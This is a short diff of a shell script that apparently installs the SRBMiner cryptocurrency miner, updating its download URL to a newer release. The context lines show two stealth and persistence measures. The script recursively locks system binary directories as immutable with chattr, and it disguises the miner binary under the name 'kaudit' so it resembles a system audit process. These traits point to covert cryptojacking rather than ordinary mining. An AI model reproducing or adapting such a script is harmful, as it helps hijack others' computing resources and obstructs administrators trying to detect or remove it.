@@ -45,7 +45,7 @@ sudo chattr -R +i /bin /usr/bin /sbin /usr/sbin 2>/dev/null || true
 echo "[*] Starting SRBMiner Dual Mining Setup Script"
 
 # Constants
-SRB_URL="https://github.com/doktor83/SRBMiner-Multi/releases/download/2.8.5/SRBMiner-Multi-2-8-5-Linux.tar.gz"
+SRB_URL="https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.1/SRBMiner-Multi-3-4-1-Linux.tar.gz"
 SRB_ARCHIVE="/tmp/srb.tar.gz"
 SRB_DIR="/opt/srbminer"
 SRB_BINARY="$SRB_DIR/kaudit"
